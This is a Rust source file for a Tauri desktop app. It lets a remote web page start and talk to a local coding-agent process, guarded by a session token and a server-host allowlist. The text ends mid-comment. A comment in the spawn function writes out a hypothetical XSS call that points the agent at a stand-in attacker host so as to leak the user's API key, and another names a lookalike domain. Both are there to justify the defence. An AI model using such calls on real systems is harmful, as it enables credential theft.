//! Ponte nativa do **Modo Code** (F2). Expõe ao ShvIA web (página remota) o que
//! só o desktop pode fazer: spawnar o `anna --json` como **sidecar** na pasta do
//! projeto, conversar por stdin/stdout (NDJSON), escolher pasta e guardar o
//! vínculo projeto→pasta.
//!
//! Postura de menor privilégio (ADR-001): **não** usa comando/IPC Tauri. O canal
//! page→Rust é o **message-handler nativo do WebView**, que muda por SO:
//! `window.webkit.messageHandlers.shviaCode` no WebKit (Linux/macOS) e
//! `window.chrome.webview` no WebView2 (Windows). Rust→page é sempre `eval`. O
//! transporte é registrado por SO — `configure_linux_webview` (WebKitGTK),
//! `macos_ipc::install` (WKWebView) e `windows_ipc::install` (WebView2) —, mas a
//! lógica aqui é agnóstica de SO: todos chamam `handle_message`. Sem handler
//! (ex.: mobile) o shim não define `window.__shviaDesktop`, então o web esconde
//! o Modo Code (fail-safe).
//!
//! Protocolo NDJSON do `anna`: `SHVIA-CODE/docs/embedding.md`.

use std::collections::HashMap;
use std::io::{BufRead, BufReader, Write};
use std::path::PathBuf;
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use tauri::{Manager, WebviewWindow};
use tauri_plugin_notification::NotificationExt;

/// Token de capacidade da sessão do app. É injetado SOMENTE nas páginas do host
/// canônico (um dos `SERVER_HOSTS`, via `on_page_load`) dentro do shim da ponte, e
/// TODA mensagem página→Rust precisa carregá-lo em `__t`.
///
/// Fecha o furo do handler nativo ser alcançável por QUALQUER frame: o
/// `messageHandler`/`window.chrome.webview` existe para todos os frames da
/// webview, então um `<iframe>` cross-origin embutido na página poderia postar
/// `spawn`/`listTree`/`gitStatus` direto. Esse iframe NÃO consegue ler o token
/// (não injetado nele + closure do frame pai é cross-origin), então suas
/// mensagens são descartadas em `handle_message`. Uniforme nos 3 SOs — não
/// depende de API de origem de frame (que o webkit2gtk 2.0 não expõe).
static BRIDGE_TOKEN: OnceLock<String> = OnceLock::new();

/// Token da sessão (gerado uma vez por processo). 32 hex, seguro em JS/JSON.
pub fn bridge_token() -> &'static str {
    BRIDGE_TOKEN
        .get_or_init(|| uuid::Uuid::new_v4().simple().to_string())
        .as_str()
}

/// Interpola o token de sessão no placeholder `__SHVIA_BRIDGE_TOKEN__` de um
/// script injetado (BRIDGE_JS e PRICE_ALERT_NOTIFY_JS). Chamado no `on_page_load`.
pub fn inject_token(js: &str) -> String {
    js.replace("__SHVIA_BRIDGE_TOKEN__", bridge_token())
}

/// O shim injetado em cada página (`on_page_load`). Define `window.__shviaCode`
/// (a API que a UI do Modo Code no SHVIA-WEB chama) e `window.__shviaDesktop`
/// (flag p/ o web mostrar o Modo Code SÓ onde a ponte existe). Autocontido, ES5,
/// self-guard: sem o handler nativo, não faz nada.
pub const BRIDGE_JS: &str = r#"(function () {
  if (window.__shviaCode) return;
  // Transporte página→Rust por WebView, escolhido por SO:
  //  - WebKit (Linux/macOS): window.webkit.messageHandlers.shviaCode.postMessage(str)
  //  - WebView2 (Windows):   window.chrome.webview.postMessage(str)
  // Rust→página é sempre eval (_reply/_emit). Sem nenhum dos dois → sem Modo
  // Code (fail-safe: não define __shviaCode e o web esconde o toggle).
  var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.shviaCode;
  var w2 = window.chrome && window.chrome.webview;
  if (!wk && !w2) return;
  function sendNative(str) { if (wk) { wk.postMessage(str); } else { w2.postMessage(str); } }
  var reqs = {}, seq = 0, listeners = [];
  function post(action, data) {
    return new Promise(function (res, rej) {
      var id = 'r' + (++seq);
      reqs[id] = { res: res, rej: rej };
      var msg = { action: action, reqId: id };
      if (data) for (var k in data) msg[k] = data[k];
      msg.__t = '__SHVIA_BRIDGE_TOKEN__'; // token de capacidade (ver bridge_token)
      sendNative(JSON.stringify(msg));
    });
  }
  window.__shviaCode = {
    // sessão do agente
    spawn: function (o) { return post('spawn', o || {}); },   // {projectDir, apiKey, model?, effort?, url?, engine?, modelDoClaude?}  engine:'claude' = assinatura; modelDoClaude:true = model/effort vieram de claudeModels(), nao do gateway
    send:  function (o) { return post('send', { payload: o }); }, // {type:'user',text} | {id,decision}
    kill:  function () { return post('kill'); },
    onEvent: function (cb) { if (typeof cb === 'function') listeners.push(cb); },
    // pasta / vínculo
    pickFolder: function () { return post('pickFolder'); },
    // Escolhe arquivos com o diálogo NATIVO, que abre na última pasta usada
    // (o <input type="file"> do WebView não deixa escolher a pasta inicial e
    // caía sempre nos favoritos — queixa de 03/08). Devolve os BYTES, porque
    // a página não tem acesso ao disco: {files:[{name, dataBase64, size}],
    // skipped:[str]}. Cancelar volta {files:[], canceled:true}.
    pickFiles: function () { return post('pickFiles'); },
    // Salva artefato gerado (imagem/código) com diálogo nativo do SO. A PÁGINA
    // manda os bytes — ela tem a sessão autenticada, o Rust não. {name, dataBase64}
    // → {saved:true, path} | {saved:false} quando o usuário cancela.
    saveFile: function (o) { return post('saveFile', o || {}); },
    // Item D3: grava a config de um cliente de CLI no host. {client, baseUrl, apiKey, model}
    // → {written:true, path, backup} | {written:false} quando o usuário cancela o diálogo.
    // `client` só aceita 'continue' | 'claude-code' | 'env' — os outros do gerador da web
    // não produzem arquivo.
    writeCliConfig: function (o) { return post('writeCliConfig', o || {}); },
    getBinding: function (pid) { return post('getBinding', { projectId: pid }); },
    setBinding: function (pid, path) { return post('setBinding', { projectId: pid, path: path }); },
    // painel da pasta (read-only, pelo app)
    gitStatus: function (path) { return post('gitStatus', { path: path }); },
    listTree: function (path) { return post('listTree', { path: path }); },
    // Catálogo do motor Claude Code, perguntado ao Agent SDK (não é o catálogo
    // do gateway). Cada item traz supportsEffort + supportedEffortLevels, para a
    // UI listar o que existe e DESABILITAR o que não se aplica.
    // → {modelos:[{value,resolvedModel,displayName,description,supportsEffort,supportedEffortLevels}]} | {erro}
    claudeModels: function () { return post('claudeModels'); },
    // CAPACIDADES desta casca. Constante local, sem ida ao Rust — a pergunta é
    // "esta versão do app sabe fazer X?", e a resposta está na própria casca.
    //
    // ⚠️ Por que existe. A página do Modo Code vem do SERVIDOR e atualiza a cada
    // deploy; o `anna` e o `claude-runner` vêm EMBUTIDOS no app instalado. Os dois
    // andam em ritmos diferentes, então uma página nova conversando com uma casca
    // velha é o estado normal, não a exceção. Sem este flag, a página mandaria
    // `images` no payload e a casca velha — que só lê `text` — descartaria a
    // figura em SILÊNCIO: o chip na tela dizendo que foi, o modelo respondendo
    // sem ter visto nada. Ausência do flag é a resposta "não", e é por isso que
    // ele testa presença em vez de comparar número de versão.
    //
    //   imagem: os DOIS motores carregam imagem no turno (anna >= 0.11.4 pelo
    //           campo `images`; claude-runner por blocos do Agent SDK).
    recursos: { imagem: true },
    // chamados pelo Rust (eval):
    _reply: function (id, ok, data) { var r = reqs[id]; if (r) { delete reqs[id]; ok ? r.res(data) : r.rej(data); } },
    _emit: function (evt) { for (var i = 0; i < listeners.length; i++) { try { listeners[i](evt); } catch (e) {} } }
  };
  window.__shviaDesktop = wk ? { platform: 'webkit', bridge: 'webkit' }
                             : { platform: 'windows', bridge: 'webview2' };
})();"#;

/// Um sidecar `anna` de uma janela (uma sessão code ativa por janela). `gen` é a
/// geração da sessão — a thread de stdout usa pra saber se ainda é a sessão viva.
struct Sidecar {
    child: Child,
    stdin: ChildStdin,
    gen: u64,
}

/// Registro de sidecars por rótulo de janela — em Tauri managed state.
/// Cada entrada fica em `Option<Sidecar>` para que `send_line` consiga TIRAR
/// o sidecar do mapa sob o lock, escrever no stdin FORA do lock (o pipe pode
/// bloquear se o anna estiver ocupado), e devolver a entrada no lock de novo.
#[derive(Default)]
pub struct Sidecars {
    map: Mutex<HashMap<String, Option<Sidecar>>>,
    next_gen: AtomicU64,
}

impl Sidecars {
    fn kill_label(&self, label: &str) {
        // Remove sob o lock, mas mata/espera FORA dele — child.wait() pode bloquear
        // e seguraria o Mutex global (send/insert de outras janelas travariam).
        let sc = self
            .map
            .lock()
            .ok()
            .and_then(|mut m| m.remove(label))
            .and_then(|opt| opt);
        if let Some(mut sc) = sc {
            let _ = sc.child.kill();
            let _ = sc.child.wait();
        }
    }

    /// Mata o sidecar de UMA janela (fechou a janela).
    pub fn kill_one(&self, label: &str) {
        self.kill_label(label);
    }

    /// Há sessão do Code viva nesta janela?
    ///
    /// Existe para o guard de fechamento (`decidir_fechar`): fechar com `anna` no ar
    /// perde a sessão **e** deixa o processo órfão. Medido em 20/08/2026 nesta máquina:
    /// **dois** `anna` vivos e um `shvia-desktop` zumbi desde 06/08 — órfão não é
    /// hipótese, é o estado atual.
    ///
    /// `Some(None)` no mapa é sessão em criação (o slot é reservado antes do spawn), e
    /// conta como viva de propósito: perguntar de graça é barato, fechar por cima de um
    /// spawn em curso deixa exatamente o órfão que este guard existe para evitar.
    pub fn tem_sessao(&self, label: &str) -> bool {
        self.map.lock().map(|m| m.contains_key(label)).unwrap_or(false)
    }

    /// Mata todos (saída do app — anti-órfão).
    pub fn kill_all(&self) {
        let drained: Vec<Sidecar> = self
            .map
            .lock()
            .ok()
            .map(|mut m| {
                m.drain()
                    .filter_map(|(_, opt)| opt)
                    .collect()
            })
            .unwrap_or_default();
        for mut sc in drained {
            let _ = sc.child.kill();
            let _ = sc.child.wait();
        }
    }

    /// Registra o sidecar da janela (nova geração), matando o anterior (troca de
    /// sessão). Devolve a geração desta sessão.
    fn insert(&self, label: String, child: Child, stdin: ChildStdin) -> u64 {
        let gen = self.next_gen.fetch_add(1, Ordering::Relaxed) + 1;
        let old = self.map.lock().ok().and_then(|mut m| {
            m.insert(
                label,
                Some(Sidecar {
                    child,
                    stdin,
                    gen,
                }),
            )
        });
        if let Some(Some(mut old)) = old {
            let _ = old.child.kill();
            let _ = old.child.wait();
        }
        gen
    }

    /// A sessão viva desta janela ainda é a geração `gen`? (senão houve respawn/kill,
    /// e a thread de stdout velha NÃO deve sinalizar 'exited' pra não derrubar a nova).
    fn is_current(&self, label: &str, gen: u64) -> bool {
        self.map
            .lock()
            .map(|m| {
                m.get(label)
                    .and_then(|opt| opt.as_ref())
                    .map(|sc| sc.gen == gen)
                    .unwrap_or(false)
            })
            .unwrap_or(false)
    }

    /// Escreve uma linha no stdin do sidecar da janela (mensagem ou decisão).
    /// `false` = não havia sessão viva ou a escrita falhou (o host então sabe que
    /// a decisão/mensagem caiu, em vez de assumir ok).
    ///
    /// Importante: o `writeln!+flush` acontece FORA do Mutex global — se o pipe
    /// do anna encher (tool longa, gate bloqueante), só esta chamada trava;
    /// outras janelas e o spawn/kill continuam funcionando.
    fn send_line(&self, label: &str, line: &str) -> bool {
        let mut sidecar = match self.map.lock() {
            Ok(mut map) => match map.get_mut(label) {
                Some(slot) => slot.take(),
                None => None,
            },
            Err(_) => None,
        };
        let Some(mut sc) = sidecar.take() else {
            return false;
        };
        let ok = writeln!(sc.stdin, "{line}").and_then(|_| sc.stdin.flush()).is_ok();
        if let Ok(mut map) = self.map.lock() {
            if let Some(slot) = map.get_mut(label) {
                *slot = Some(sc);
            }
            // Se a janela foi removida entre os dois locks, recria sem gravar
            // de volta (a sessão está morta). Sem leak: o Child morre no drop.
        }
        ok
    }
}

/// Catálogo de modelos do motor Claude Code, perguntado ao próprio SDK.
///
/// Roda `claude-runner --modelos`, que chama `supportedModels()` do Agent SDK e
/// devolve, por modelo, `value`/`displayName`/`description` **e** `supportsEffort`
/// + `supportedEffortLevels`. É o que permite à UI listar o que existe e
/// desabilitar o que não se aplica, em vez de mostrar o catálogo do gateway
/// (`openai/gpt-5.6-sol`), que não significa nada aqui.
///
/// **Por que perguntar em vez de manter uma lista nossa:** o Claude Code tem
/// aliases próprios (`opus`, `sonnet`, `fable`, `opus[1m]`, `opusplan`, `best`…)
/// que mudam com o cliente. Uma cópia na casa envelheceria em silêncio, e o
/// sintoma seria alguém escolher um modelo que o motor recusa.
///
/// Medido em 21/08: a chamada é de canal de controle e **não consome turno**.
/// Falha nunca é fatal — devolve `erro` e a UI cai no fallback dela; catálogo
/// vazio apresentado como "nenhum modelo" seria pior que dizer que não deu.
fn claude_models() -> serde_json::Value {
    let Some(bin) = resolve_bin("claude-runner") else {
        return serde_json::json!({ "erro": "claude-runner não encontrado" });
    };
    let mut cmd = Command::new(bin);
    cmd.arg("--modelos");
    if let Some(p) = crate::user_env::sidecar_path() {
        cmd.env("PATH", p);
    }
    match cmd.output() {
        Ok(o) => String::from_utf8_lossy(&o.stdout)
            .lines()
            .find_map(|l| serde_json::from_str::<serde_json::Value>(l).ok())
            .filter(|v| v.get("modelos").is_some())
            .unwrap_or_else(|| serde_json::json!({ "erro": "resposta do claude-runner ilegível" })),
        Err(e) => serde_json::json!({ "erro": format!("falha ao listar modelos: {e}") }),
    }
}

/// Versão do `anna` que ESTE app usaria, com a **origem** junto.
///
/// Existe por causa de 19/08. O Modo Code travava no 422 do gateway com o app na
/// última versão e um `anna 0.8.4` de julho assado dentro dele — e a versão do
/// sidecar não aparecia em lugar nenhum: nem no app, nem na tela de erro, que
/// mandava "atualize o app" enquanto o app já estava atualizado. Diagnóstico que
/// depende de alguém rodar `--version` num binário escondido dentro de um bundle
/// é diagnóstico que ninguém faz.
///
/// A **origem** vai junto porque foi ela que escondeu o caso: o empacotado vence
/// o do PATH (ver `resolve_bin`), então instalar um `anna` novo no PATH não muda
/// nada — e sem essa palavra na tela, a conclusão natural é a errada.
///
/// Roda `--version` na hora do clique. É subprocesso no thread da UI, e o risco
/// aceito é um binário que trave em `--version` travar o modal; na prática ele
/// responde imediato, e é o mesmo caminho que o `stage-anna.mjs` já usa no build.
pub(crate) fn versao_do_anna() -> String {
    let Some(bin) = resolve_bin("anna") else {
        return "não encontrado".into();
    };
    let empacotado = std::env::current_exe()
        .ok()
        .and_then(|exe| exe.parent().map(|dir| bin.starts_with(dir)))
        .unwrap_or(false);
    let origem = if empacotado { "empacotado" } else { "externo" };

    let bruto = std::process::Command::new(&bin)
        .arg("--version")
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default();

    // O valor é interpolado numa string JS antes do `eval` (ver ABOUT_MODAL_JS):
    // qualquer coisa fora deste conjunto sai, para a saída de um binário nunca
    // conseguir fechar a aspa e virar código.
    let limpo: String = bruto
        .trim_start_matches("anna ")
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '+' | '_'))
        .take(32)
        .collect();

    if limpo.is_empty() {
        format!("? ({origem})")
    } else {
        format!("v{limpo} ({origem})")
    }
}

/// Localiza um binário de motor (`anna` ou `claude-runner`), cross-platform.
///
/// Ordem: (1) **ao lado do executável do ShvIA Desktop**; (2) no PATH; (3) locais
/// conhecidos por SO (`~/.local/bin/<base>` no Unix, `%LOCALAPPDATA%\Programs\
/// <base>\<base>.exe` no Windows).
///
/// **O empacotado vence o do PATH, e isso é decisão** (item D5). Desde a 0.18.0 o
/// `anna` viaja no instalador como `externalBin`, e ele é o que foi testado com
/// ESTA versão do app. Um `anna` velho esquecido no PATH — o caso comum de quem
/// instalou à mão meses atrás — passaria a decidir o comportamento do Modo Code,
/// e o sintoma seria "funciona na sua máquina" sem ninguém suspeitar do PATH.
///
/// Quem quer usar o próprio `anna` de propósito ainda consegue: basta não haver
/// binário empacotado (build sem `--anna`), ou apontar o do PATH por instalação
/// separada e usar um build sem o sidecar.
fn resolve_bin(base: &str) -> Option<PathBuf> {
    let exe_name = if cfg!(windows) { format!("{base}.exe") } else { base.to_string() };

    // (1) Ao lado do próprio app (bundled).
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            let p = dir.join(&exe_name);
            if p.exists() {
                return Some(p);
            }
        }
    }

    // (2)+(3) por SO.
    #[cfg(windows)]
    {
        if let Ok(out) = Command::new("where").arg(base).output() {
            if out.status.success() {
                // `where` pode listar vários — pega a 1ª linha.
                if let Some(line) = String::from_utf8_lossy(&out.stdout).lines().next() {
                    let p = PathBuf::from(line.trim());
                    if p.exists() {
                        return Some(p);
                    }
                }
            }
        }
        if let Ok(local) = std::env::var("LOCALAPPDATA") {
            let p = PathBuf::from(local).join("Programs").join(base).join(&exe_name);
            if p.exists() {
                return Some(p);
            }
        }
    }

    #[cfg(not(windows))]
    {
        let mut probe = Command::new("sh");
        probe.arg("-c").arg(format!("command -v {base}"));
        if let Some(p) = crate::user_env::sidecar_path() {
            probe.env("PATH", p);
        }
        if let Ok(out) = probe.output() {
            if out.status.success() {
                let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
                if !p.is_empty() {
                    return Some(PathBuf::from(p));
                }
            }
        }
        if let Ok(home) = std::env::var("HOME") {
            let p = PathBuf::from(home).join(".local/bin").join(base);
            if p.exists() {
                return Some(p);
            }
        }
    }

    None
}

/// Prontidão do motor: onde ele está e qual versão (item D5).
///
/// O handshake existe porque "o Modo Code não funciona" tem **duas** causas que se
/// parecem na tela — não há binário, ou há um que não roda (arquitetura errada,
/// corrompido, sem permissão de execução). Sem perguntar a versão não dá para
/// distinguir, e o usuário fica tentando reinstalar o que já está lá.
///
/// `--version` com timeout curto: isto é chamado da UI, e um binário travado não
/// pode segurar a tela.
pub fn engine_status(base: &str) -> serde_json::Value {
    let Some(bin) = resolve_bin(base) else {
        return serde_json::json!({
            "found": false,
            "bundled": false,
            "version": null,
            "path": null,
        });
    };

    // "Empacotado" = está ao lado do executável do app. É o que o instalador
    // coloca lá, e distinguir isso do que veio do PATH é o que permite dizer ao
    // usuário se ele está rodando o motor testado com esta versão.
    let bundled = std::env::current_exe()
        .ok()
        .and_then(|e| e.parent().map(|d| d.to_path_buf()))
        .is_some_and(|dir| bin.parent() == Some(dir.as_path()));

    let versao = Command::new(&bin)
        .arg("--version")
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .filter(|s| !s.is_empty());

    serde_json::json!({
        // `found` é o binário EXISTIR; `version` é ele RESPONDER. Os dois separados
        // de propósito: found=true com version=null é o caso "está lá e não roda",
        // que é diagnóstico diferente de "não está lá".
        "found": true,
        "bundled": bundled,
        "version": versao,
        "path": bin.to_string_lossy(),
    })
}

/// Ponto de entrada do handler nativo: recebe uma mensagem JSON da página.
pub fn handle_message(window: &WebviewWindow, payload: &str) {
    let v: serde_json::Value = match serde_json::from_str(payload) {
        Ok(v) => v,
        Err(_) => return,
    };
    // Cap de capacidade: só a página injetada num host de SERVER_HOSTS conhece o token
    // de sessão. Um <iframe> cross-origin embutido alcança o messageHandler
    // nativo mas não tem o token → descartado (silêncio, sem oráculo). Cobre os
    // 3 SOs num só ponto, sem depender de API de origem de frame.
    if v.get("__t").and_then(|t| t.as_str()) != Some(bridge_token()) {
        return;
    }
    let action = v.get("action").and_then(|a| a.as_str()).unwrap_or_default();
    let req = v.get("reqId").and_then(|r| r.as_str()).unwrap_or_default().to_string();
    match action {
        "spawn" => spawn(window, &req, &v),
        "send" => {
            let ok = send(window, &v);
            reply(window, &req, ok, serde_json::json!({ "ok": ok }));
        }
        "kill" => {
            window.app_handle().state::<Sidecars>().kill_label(window.label());
            reply(window, &req, true, serde_json::json!({ "ok": true }));
        }
        "pickFolder" => pick_folder(window, req),
        "pickFiles" => pick_files(window, req),
        "saveFile" => save_file(window, req, &v),
        "getBinding" => {
            let pid = v.get("projectId").and_then(|p| p.as_str()).unwrap_or_default();
            let path = load_bindings(window).get(pid).and_then(|x| x.as_str()).map(String::from);
            reply(window, &req, true, serde_json::json!({ "path": path }));
        }
        "setBinding" => {
            set_binding(window, &v);
            reply(window, &req, true, serde_json::json!({ "ok": true }));
        }
        "gitStatus" => {
            let path = v.get("path").and_then(|x| x.as_str()).unwrap_or_default();
            reply(window, &req, true, git_status(path));
        }
        "listTree" => {
            let path = v.get("path").and_then(|x| x.as_str()).unwrap_or_default();
            reply(window, &req, true, list_tree(path));
        }
        "claudeModels" => {
            let out = claude_models();
            let ok = out.get("modelos").is_some();
            reply(window, &req, ok, out);
        }
        // Notificação nativa do SO (alertas de preço, ADR-011). Fire-and-forget:
        // sem reqId/reply — a página só dispara, não espera resposta.
        "notify" => notify(window, &v),
        // Contagem no ícone do dock/taskbar (ADR-011, revisado na 0.13.0).
        // Fire-and-forget pela mesma razão do notify.
        "badge" => badge(window, &v),
        // Handshake de prontidão do motor (item D5). A página pergunta ANTES de
        // oferecer o Modo Code, para a tela poder dizer "anna 0.8.5 pronto" ou
        // "instale o anna" em vez de deixar a pessoa descobrir no primeiro turno.
        // Item D3 (ADR-026): escreve a config de um cliente de CLI no host. A página manda
        // VALORES (cliente, base, chave, modelo) — nunca caminho nem conteúdo de arquivo.
        // Quem monta o JSON e escolhe o destino de uma lista fechada é o Rust, e o usuário
        // confirma num diálogo nativo com o caminho à vista.
        "writeCliConfig" => crate::cli_config::escrever(window, req, &v),
        "engineStatus" => {
            let base = v.get("engine").and_then(|x| x.as_str()).unwrap_or("gateway");
            let exe = if base == "claude" { "claude-runner" } else { "anna" };
            let st = engine_status(exe);
            reply(window, &req, true, st);
        }
        _ => reply(window, &req, false, serde_json::json!({ "error": "ação desconhecida" })),
    }
}

/// `true` se `url` for um endereço https de um host do servidor do ShvIA
/// (`crate::SERVER_HOSTS`). Usada para validar o campo `url` que a PÁGINA manda no
/// `spawn` — a mesma allowlist exata de `is_internal` e de
/// `windows_ipc::ALLOWED_MESSAGE_ORIGINS`, para o perímetro ter uma resposta só.
///
/// Compara HOST parseado, nunca prefixo de string: `starts_with` deixaria passar
/// `https://ai.shvia.org.atacante.tld`, que é outro domínio.
fn url_do_servidor(url: &str) -> bool {
    match url.parse::<tauri::Url>() {
        Ok(u) => u.scheme() == "https" && u.host_str().is_some_and(crate::is_server_host),
        Err(_) => false,
    }
}

fn spawn(window: &WebviewWindow, req: &str, v: &serde_json::Value) {
    let s = |k: &str| v.get(k).and_then(|x| x.as_str()).unwrap_or_default().to_string();
    let dir = s("projectDir");
    if dir.is_empty() || !PathBuf::from(&dir).is_dir() {
        return reply(window, req, false, serde_json::json!({ "error": "pasta do projeto inválida" }));
    }
    // Motor: "gateway" (anna, default) ou "claude" (claude-runner — Claude Code
    // com a ASSINATURA do usuário, FORA do gateway). Ambos falam o mesmo NDJSON
    // (embedding.md), então o bridge e a UI de cards não mudam. Sem `engine` = anna.
    let engine = s("engine");
    let is_claude = engine == "claude";
    let exe_base = if is_claude { "claude-runner" } else { "anna" };
    let Some(bin) = resolve_bin(exe_base) else {
        let err = if is_claude {
            "claude-runner não encontrado — rode claude-runner/install.sh (deixa em ~/.local/bin) e faça `claude login` (usa a assinatura; sem API key)."
        } else {
            "anna não encontrado. Este build saiu SEM o motor empacotado — instale o anna (SHVIA-CODE) e deixe no PATH (Unix: install.sh; Windows: anna.exe no PATH ou %LOCALAPPDATA%\\Programs\\anna)"
        };
        return reply(window, req, false, serde_json::json!({ "error": err }));
    };

    let mut cmd = Command::new(bin);
    cmd.current_dir(&dir);
    // App de GUI não herda o PATH do shell (ADR-029): sem isto o agente não
    // encontra npx/node/cargo/php e fica insistindo em comando que não existe.
    if let Some(p) = crate::user_env::sidecar_path() {
        cmd.env("PATH", p);
    }
    let (model, effort, url, key) = (s("model"), s("effort"), s("url"), s("apiKey"));

    // `url` vem da PÁGINA e viaja junto com SHVIA_API_KEY (a chave do usuário) —
    // então é entrada não confiável no caminho de um segredo, e passa pela MESMA
    // allowlist do resto do perímetro (`crate::SERVER_HOSTS`). Sem esta checagem,
    // um XSS na página do ShvIA — ou um asset de terceiro comprometido; a CSP do
    // web nasce DESLIGADA (SHVIA-WEB/config/security.php) — chamaria
    // `__shviaCode.spawn({url:'https://coletor.atacante.tld', apiKey:'…'})` e o
    // agente mandaria a chave em `X-API-Key` para lá. O anna só exige https, e
    // https qualquer atacante tem.
    //
    // Rejeitar é seguro para o uso legítimo: o web manda `location.origin`
    // (code-mode.js), e uma página que roda num host do servidor tem, por
    // definição, origem que passa. Falha ALTO em vez de cair no default
    // compilado — silenciar mandaria o turno para o host errado sem sintoma.
    if !url.is_empty() && !url_do_servidor(&url) {
        return reply(
            window,
            req,
            false,
            serde_json::json!({ "error": "url de servidor não autorizada" }),
        );
    }
    if is_claude {
        // Assinatura via cliente oficial: NADA de SHVIA_API_KEY nem `--url` — este
        // motor não passa pelo gateway, então chave e endpoint do ShvIA não se
        // aplicam e mandá-los seria vazar credencial para fora do perímetro dele.
        //
        // `--model` e `--effort` SIM (21/08) — mas **só quando a página garante
        // que vieram do catálogo do Claude**, via `modelDoClaude: true`.
        //
        // Sem essa trava a correção viraria regressão: até agora o modelo era
        // lido e descartado aqui, então a UI mandando `openai/gpt-5.6-sol` (o
        // catálogo do GATEWAY, que é o que ela ainda mostra com o motor Claude
        // ativo) não fazia mal nenhum. Repassar sem conferir trocaria "seletor que
        // não faz nada" por "sessão que não abre" — pior, porque quebra o que
        // funcionava.
        //
        // A trava é declarativa de propósito: nada de adivinhar pela forma do id
        // (`contém '/'`?), que erraria no primeiro alias novo. Quem sabe de qual
        // catálogo o valor saiu é quem montou o seletor, e ela diz.
        cmd.args(["--cwd", &dir]);
        let do_claude = v.get("modelDoClaude").and_then(|x| x.as_bool()).unwrap_or(false);
        if do_claude && !model.is_empty() {
            cmd.args(["--model", &model]);
        }
        if do_claude && !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
        // Aprovação NÃO depende de `modelDoClaude`: os níveis são os mesmos dos
        // dois motores (manual/edit/auto), implementados por código nosso — o
        // hook `PreToolUse` do runner, que é quem faz o cartão de aprovação
        // aparecer. Não há catálogo a conciliar aqui, então o valor passa direto.
        let aprovacao = s("approval");
        if !aprovacao.is_empty() {
            cmd.args(["--aprovacao", &aprovacao]);
        }
    } else {
        cmd.arg("--json").args(["--tools", "local"]);
        if !model.is_empty() {
            cmd.args(["--model", &model]);
        }
        if !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
        if !url.is_empty() {
            cmd.args(["--url", &url]);
        }
        if !key.is_empty() {
            cmd.env("SHVIA_API_KEY", &key); // chave do usuário, repassada pelo web (nunca logada)
        }
    }
    cmd.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => return reply(window, req, false, serde_json::json!({ "error": format!("falha ao iniciar anna: {e}") })),
    };
    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");
    let stdin = child.stdin.take().expect("stdin piped");

    // Guarda no state, matando um sidecar anterior desta janela (troca de sessão).
    // A geração desta sessão acompanha a thread de stdout (guarda o 'exited').
    let label = window.label().to_string();
    let gen = window.app_handle().state::<Sidecars>().insert(label.clone(), child, stdin);

    // stderr → log do app (nunca a timeline).
    let tag = exe_base.to_string();
    std::thread::spawn(move || {
        for line in BufReader::new(stderr).lines().map_while(Result::ok) {
            eprintln!("[{tag}] {line}");
        }
    });

    // stdout NDJSON → evento na página (`_emit`), no main thread (WebKit).
    let win = window.clone();
    let exit_label = label;
    std::thread::spawn(move || {
        let app = win.app_handle().clone();
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if line.trim().is_empty() {
                continue;
            }
            let js = format!("window.__shviaCode&&window.__shviaCode._emit(JSON.parse({}))", js_str(&line));
            let w = win.clone();
            let _ = app.run_on_main_thread(move || {
                let _ = w.eval(&js);
            });
        }
        // stdout fechou → anna saiu. Só sinaliza 'exited' se ESTA geração ainda é a
        // sessão viva da janela; se foi substituída (respawn) ou morta (kill/troca
        // de projeto), fica quieta pra não derrubar a sessão nova que acabou de subir.
        if app.state::<Sidecars>().is_current(&exit_label, gen) {
            let w = win.clone();
            let _ = app.run_on_main_thread(move || {
                let _ = w.eval("window.__shviaCode&&window.__shviaCode._emit({type:'exited'})");
            });
        }
    });

    reply(window, req, true, serde_json::json!({ "ok": true }));
}

fn send(window: &WebviewWindow, v: &serde_json::Value) -> bool {
    let line = match v.get("payload") {
        Some(p) => serde_json::to_string(p).unwrap_or_default(),
        None => return false,
    };
    window.app_handle().state::<Sidecars>().send_line(window.label(), &line)
}

/// Dispara uma notificação nativa do SO (alertas de preço, ADR-011). Usa só a API
/// Rust do `tauri-plugin-notification` — nenhuma capability é exposta à página
/// remota (mantém o ADR-001). Best-effort: falha (permissão do SO negada, etc.) é
/// silenciosa e nunca afeta a página. `handle_message` já roda na main/UI thread
/// em todos os SOs (WKScriptMessageHandler / WebKitGTK / WebView2), então é seguro
/// mostrar a notificação daqui.
fn notify(window: &WebviewWindow, v: &serde_json::Value) {
    let title = v.get("title").and_then(|x| x.as_str()).unwrap_or("ShvIA");
    let body = v.get("body").and_then(|x| x.as_str()).unwrap_or_default();
    if body.trim().is_empty() {
        return;
    }
    // Neutraliza markup: alguns daemons de notificação freedesktop (Linux)
    // interpretam <b>/<a href> no corpo. O conteúdo é first-party (nome do item
    // que o próprio usuário cadastrou), mas removemos os sinais por precaução.
    let sanitize = |s: &str| s.replace(['<', '>'], " ");
    let _ = window
        .app_handle()
        .notification()
        .builder()
        .title(sanitize(title))
        .body(sanitize(body))
        .show();
}

/// `badge` — contagem de não lidas no ícone do dock/taskbar.
///
/// É a metade do item D8 que o plugin de notificação **permite** fazer. A outra
/// metade — clique na notificação abrindo a tela — NÃO é implementável: o
/// `desktop.rs` do `tauri-plugin-notification` 2.3 expõe só `title`, `body`,
/// `icon`, `sound` e `show`; `register_action_types` e o callback de ação existem
/// apenas no `mobile.rs`. Ver ADR-011.
///
/// Por isso o badge importa mais do que pareceria: sem clique, ele é o único sinal
/// persistente de "tem coisa te esperando" depois que o toast do SO desaparece.
///
/// ## Plataformas
///
/// `set_badge_count` cobre macOS e Linux. No **Windows** é `Unsupported` — lá o
